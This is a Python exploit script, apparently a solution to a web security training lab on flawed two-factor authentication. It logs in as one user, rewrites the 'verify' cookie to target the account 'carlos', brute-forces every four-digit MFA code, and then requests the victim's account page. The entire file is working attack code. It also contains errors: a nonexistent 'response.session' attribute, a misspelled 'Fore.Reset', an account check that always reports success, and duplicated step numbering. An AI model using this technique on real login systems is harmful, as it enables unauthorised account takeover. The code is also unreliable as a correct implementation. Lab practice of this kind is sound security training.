"""
  Lab: 2FA broken logic

  Steps:
  1. Login with the valid user wiener:peter
  2. Alter the cookie to target profile 'carlos' and erase the session cookie
  3. Brute force the mfa-code of carlos
  3. Fetch the account page using carlos account

  Author: D4mn20
"""

import argparse
from colorama import Fore
import time

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('-u', "--url", required=True, help="Target URL")
  parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
  args = parser.parse_args()

  print(f"{Fore.BLUE}Starting...{Fore.RESET}")
  session = requests.session()
  if args.proxy:
    proxies = {
      "http": args.proxy,
      "https": args.proxy
    }
    session.proxies = proxies
  session.verify = False

  print(f"{Fore.YELLOW}STEP 1:{Fore.RESET} Login as Peter.")
  data = {
    "username": "wiener",
    "password": "peter"
  }
  ok = login(args.url, data, session)
  if ok:
    print(f"{Fore.YELLOW}STEP 2:{Fore.RESET} Setting account cookie to impersonate carlos...")
    session.cookies.set("verify", "carlos")

    print(f"{Fore.YELLOW}STEP 3:{Fore.RESET} Starting brute-force on MFA code...")
    success = brute_force_mfa(args.url, session)
    if not success:
      print(f"{Fore.RED}[-] Brute-force failed.{Fore.RESET}")
      return
    
    print(f"{Fore.YELLOW}STEP 4:{Fore.RESET} Fetching /my-account as carlos...")
    if fetch(args.url, success):
      print(f"{Fore.GREEN}[+] Lab solved successfully!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to access carlos account.{Fore.RESET}")

def login(url, data, session):
  response = session.post(f"{url}/login", data, allow_redirects=False)
  return response.status_code == 302 and "session" in session.cookies.get_dict()

def brute_force_mfa(url, session):
  for code in range(10000):
    mfa_code = f"{code:04}"
    data = {"mfa-code": mfa_code}
    response = session.post(f"{url}/login2", data, allow_redirects=False)
    if response.status_code == 302 and "session" in response.session.cookies.get_dict():
      print(f"\n{Fore.GREEN}[+] Correct MFA code: {mfa_code}")
      new_session = requests.Session()
      new_session.cookies.set("session", response.cookies.get("session"))
      new_session.verify = False
      return new_session
    if code % 100 == 0:
      print(f"{Fore.CYAN}Trying {mfa_code}...", end='\r')
    time.sleep(0.1)
  return None

def fetch(url, session):
  try:
    session.get(f"{url}/my-account", allow_redirects=False)
    return True
  except ValueError as e:
    print(f"{Fore.RED}Error{Fore.Reset}: {e}")
    exit(1)
  

if __name__ == "__main__":
  main()